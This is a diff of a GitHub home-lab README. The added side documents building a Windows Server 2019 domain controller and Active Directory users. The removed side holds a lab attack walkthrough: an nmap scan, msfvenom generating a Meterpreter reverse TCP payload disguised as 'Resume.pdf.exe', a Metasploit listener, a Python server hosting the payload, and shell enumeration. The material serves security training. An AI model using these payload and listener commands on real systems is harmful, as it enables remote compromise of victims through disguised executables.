@@ -7,7 +7,7 @@
 
 ---
 
-## 🛠️TECHNOLOGY & TOOLS UTILIZED
+## 🛠️ TECHNOLOGY & TOOLS UTILIZED
 
 - **`VirtualBox:`**  
   Used as the primary virtualization platform to host multiple virtual machines in an isolated local environment for cybersecurity testing and infrastructure simulation.
@@ -31,150 +31,82 @@
 
 ## OBJECTIVE
 
-Designed and deployed a virtualized Windows domain lab using `VirtualBox`, `Windows Server 2019`, and `Windows 10` to gain hands-on experience with enterprise network infrastructure and identity management. The project focused on configuring `Active Directory`, `Group Policy`, and domain-joined `endpoints` to simulate real-world authentication, access control, and administrative workflows. This lab environment served as a foundation for practicing common security tasks, including privilege escalation prevention, user access auditing, and scripting automation with PowerShell.
+Designed and deployed a virtualized Windows domain lab using `VirtualBox`, `Windows Server 2019`, and `Windows 10` to gain hands-on experience with enterprise network infrastructure and identity management. The project focused on configuring `Active Directory`, `Group Policy`, and domain-joined `endpoints` to simulate real-world authentication, access control, and administrative workflows. This lab environment served as a foundation for practicing common security tasks, including privilege escalation prevention, user access auditing, and scripting automation with `PowerShell`.
 
 ## 👣 STEP-BY-STEP: SETTING UP THE DOMAIN CONTROLLER
 
-### Step 1: Aggressive Network Reconnaissance
+### Step 1: `Virtual Machine` Creation and Provisioning
 
-The attacker used the command `nmap -A -Pn 192.168.20.10` to perform an `aggressive scan` against the host at IP address `192.168.20.10`.
+The virtual machine, named `Domain-Controller`, was configured as a domain controller using the `Windows Server 2019 ISO`. It was provisioned with 2 GB of RAM and 4 virtual CPUs to support `Active Directory` and core infrastructure services.
 
-```bash
-nmap -A -Pn 192.168.20.10
-```
-<img width="626" height="248" alt="Lab 203" src="https://github.com/user-attachments/assets/49ff2b97-51ae-4a25-a16c-247070356a3a" /></br>
-
-Based on these results, the attacker identifies that several critical ports are open on the target system, including `135/tcp (RPC)`, `139/tcp (NetBIOS Session Service)`, `445/tcp (Microsoft-DS/SMB)`, and `3389/tcp (Remote Desktop Protocol - RDP)`. These open ports provide potential attack vectors, as they correspond to services that, if improperly secured, can be exploited for unauthorized access, information gathering, or lateral movement within the network.
+<img width="755" height="580" alt="Lab 1" src="https://github.com/user-attachments/assets/e081d054-9449-483e-a0cf-f4a4de7ce8d5" /></br>
 
 ---
 
-### Step 2: Generate a Malicious Reverse TCP Payload for Remote Access
+### Step 2: Configure `Network Adapters`
 
-```bash
-msfvenom -l payloads
-```
-The command `msfvenom -l payloads` lists all available payload options that can be generated using the Metasploit Framework’s msfvenom tool.
+For networking, `Network Adapter 1` was enabled and attached to `NAT` to allow internet access. `Network Adapter 2` was connected to an `internal network` named `Test 3` to facilitate isolated communication between lab machines without external exposure.
 
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.20 lport=4444 -f exe -o Resume.pdf.exe
-```
-The attacker uses `msfvenom` to generate a 64-bit Windows executable payload (`Resume.pdf.exe`) that, when run on the target system, initiates a reverse TCP connection back to the attacker’s machine at `IP 192.168.20.20` on `port 4444`, allowing remote control via a `Meterpreter` session.
+<img width="1131" height="471" alt="Lab 4" src="https://github.com/user-attachments/assets/c379a872-b1dc-4bb6-880b-a0917fe99f13" /></br>
 
-```bash
-ls
-```
-
-```bash
-file Resume.pdf.exe
-```
-
-The commands `ls` and `file Resume.pdf.exe` are used to verify the presence of the generated payload file and confirm its file type as a Windows executable.
-
-<img width="603" height="317" alt="Lab 204" src="https://github.com/user-attachments/assets/28eaebe8-ff59-4c9a-80ca-9fd9815a45cf" />
+<img width="1134" height="472" alt="Lab 5" src="https://github.com/user-attachments/assets/06246298-cf3c-4f36-b51d-e89544dc861c" /></br>
 
 ---
 
-### Step 3: Setting Up a Metasploit Listener for a Reverse TCP Shell
+### Step 3: `Windows Setup`
 
-```bash
-msfconsole
-```
+Powered on the virtual machine and proceeded through the Windows Server 2019 installation process using the ISO image.
 
-```bash
-set payload windows/x64/meterpreter/reverse_tcp payload
-```
+<img width="636" height="476" alt="Lab 6" src="https://github.com/user-attachments/assets/31f0efb0-f514-40d9-8987-d7ba2b00bff5" /></br>
 
-```bash
-set lhost 192.168.20.20
-```
-
-```bash
-options
-```
-
-The attacker is launching the Metasploit console `msfconsole`, configuring it to use the `windows/x64/meterpreter/reverse_tcp payload`, and setting the local host `lhost` IP address to `192.168.20.20`, which prepares the listener to receive a reverse connection from the target system.
-
-<img width="593" height="334" alt="Lab 205" src="https://github.com/user-attachments/assets/69f11c14-5674-435c-baf5-82906215863e" />
+*Windows Server 2019 Standard Evaluation (Desktop Experience) → Accept the license terms → Username: Administrator → Password: Password18*
 
 ---
 
-### Step 4: Hosting a Malicious Payload Using a Python HTTP Server
+### Step 4: Check `Network Configuration`
 
-```bash
-ls
-```
+Checked the `network connection details` of the virtual machine and observed it was automatically assigned an IPv4 address of `169.254.120.207`, indicating an `APIPA` (Automatic Private IP Addressing) address.
 
-```bash
-python3 -m http.server 9999
-```
+<img width="357" height="434" alt="Lab 9" src="https://github.com/user-attachments/assets/45c3d59a-f363-406e-b31b-a33ed6a64961" /></br>
 
-The attacker lists the current directory with `ls`, then uses `python3 -m http.server 9999` to start a simple HTTP server on `port 9999`, allowing files in that directory (such as a malicious payload) to be served and downloaded by a target machine.
+Under `Network Connections`, we renamed the NAT adapter to `Internet` and the internal network adapter to `Internal_Network` for better clarity. The `Internet_Network` adapter was then manually configured with the following static IP settings:  
+- **IP address:** `172.16.0.1`  
+- **Subnet mask:** `255.255.255.0`  
+- **Preferred DNS server:** `127.0.0.1`
 
-<img width="493" height="256" alt="Lab 79" src="https://github.com/user-attachments/assets/98f1f922-ef4b-49ef-8f23-fec7373ebfec" /></br>
+<img width="782" height="159" alt="Lab 10" src="https://github.com/user-attachments/assets/2804da41-c4c7-45be-9c22-80c003b31bb3" /></br>
 
-<img width="316" height="209" alt="Lab 206" src="https://github.com/user-attachments/assets/aec51636-2e18-4075-b114-70bf6a838ecf" /></br>
-
-<img width="783" height="168" alt="Lab 207" src="https://github.com/user-attachments/assets/d0256e34-a026-4331-936f-3f5358de998c" /></br>
-
-*Note: Having `file extensions` enabled is important because it allows users to see the true format of a file, helping them identify potentially malicious files disguised with misleading names (e.g., `resume.pdf` that is actually `resume.pdf.exe`). Without extensions visible, users may unknowingly open executable files thinking they are safe documents, increasing the risk of malware execution.*
+<img width="755" height="455" alt="Lab 11" src="https://github.com/user-attachments/assets/b898dda0-d4af-41cb-9547-9c77c69ce378" /></br>
 
 ---
 
-### Step 5: Active Network Connection
+### Step 5: Set Up `Active Directory`
 
-```bash
-network -anob
-```
+In `Server Manager`, we began by launching the `Add Roles and Features` Wizard to install `Active Directory Domain Services` (AD DS). During the setup, we also included `Group Policy Management` and `Remote Server Administration Tools` (RSAT) to enable centralized domain control and administrative functionality.
 
-The command `netstat -anob` is used on Windows to display all active network connections and listening ports `-a`, show addresses and port numbers in numerical form `-n`, include the executable (binary) responsible for each connection `-b`, and display the owning process ID `-o`.
+<img width="1001" height="741" alt="Lab 12" src="https://github.com/user-attachments/assets/c5771a04-7c98-4775-b2da-d8c923f4b627" /></br>
 
-<img width="602" height="69" alt="Lab 209" src="https://github.com/user-attachments/assets/90cdb1bb-f267-471a-a16b-2f896dc91bee" />
+<img width="783" height="556" alt="Lab 22" src="https://github.com/user-attachments/assets/009e3290-608c-4122-8e58-9fac3755b499" /></br>
 
-With the execution of the `Resume.pdf.exe` payload on the victim’s machine, the attacker can now observe that a reverse TCP connection has been successfully established. Using tools like `netstat`, the attacker confirms that their machine `192.168.20.20` is actively connected to the victim’s system `192.168.20.10` over a designated port, indicating that the Meterpreter session is live and the payload has executed as intended, granting remote access to the target.
+After completing the role installation, we proceeded with the `post-deployment configuration` by promoting the server to a domain controller. During the configuration, we created a new forest with the root domain name `mydomain.com`, and enabled both the `Domain Name System` (DNS) server and `Global Catalog` (GC) options. We also set the NetBIOS domain name to `MYDOMAIN`.
 
-<img width="662" height="188" alt="Lab 212" src="https://github.com/user-attachments/assets/3952f535-6f1a-4287-ad98-2b07cc678794" />
+<img width="1227" height="764" alt="Lab 31" src="https://github.com/user-attachments/assets/ba1b4759-d514-4bc1-9d9b-f6541081624d" /></br>
 
 ---
 
-### Step 6: Establishing a Reverse Shell and Enumerating the Victim System
+### Step 6: Set up `Domain Admins` and `Domain Users`
 
-```bash
-exploit
-```
+After logging back into the server, we navigated to `Active Directory Users and Computers` to begin configuring domain objects. We created a new `Organizational Unit` (OU) named `_ADMINS`, and within that OU, added a new user account with the full name `Briana Willis` and the user logon name `a-bwillis`.
 
-```bash
-shell
-```
+<img width="433" height="374" alt="Lab 40" src="https://github.com/user-attachments/assets/051ed52a-ed78-447a-93a8-6a89ad11aa60" /></br>
 
-```bash
-netuser
-```
+Within `Briana Willis’` account properties in `Active Directory Users and Computers`, we navigated to the `Member Of` tab and added the user to the `Domain Admins` group. This granted her administrative privileges across the domain. 
 
-```bash
-net localgroup
-```
-
-```bash
-ipconfig
-```
-
-The attacker runs the `exploit` command in Metasploit’s multi/handler module to begin listening for the reverse connection from the victim. Once the connection is established, they gain a `shell` on the victim’s machine, allowing them to run commands like `net user` (to enumerate local user accounts) and `ipconfig` (to view the victim’s network configuration), effectively confirming access and gathering initial system information.
-
-<img width="619" height="98" alt="Lab 85" src="https://github.com/user-attachments/assets/6910c5ce-d789-4c9d-a055-72f2e0ff6cc8" />
-
-<img width="542" height="477" alt="Lab 86" src="https://github.com/user-attachments/assets/df91683c-2ada-4fc4-aeb0-a22e175f13ed" />
+<img width="1225" height="763" alt="Lab 45" src="https://github.com/user-attachments/assets/b9c074da-91da-4683-9aa3-637794e44dcc" /></br>
 
 ---
 
-## 🔎 ANALYZING SPLUNK
 
-<img width="946" height="201" alt="Lab 215" src="https://github.com/user-attachments/assets/62738a87-be11-4f3d-8966-ba165ec011ff" /></br>
-
-<img width="954" height="201" alt="Lab 216" src="https://github.com/user-attachments/assets/872b8338-9dd4-411d-b82c-ad74b105c1c1" /></br>
-
-<img width="636" height="389" alt="Lab 218" src="https://github.com/user-attachments/assets/6652024f-b6e4-4827-8415-75d715853891" /></br>
-
-<img width="1284" height="395" alt="Lab 220" src="https://github.com/user-attachments/assets/bee72274-9860-471d-a6f3-462c2ededa7d" />
 
 ---
 
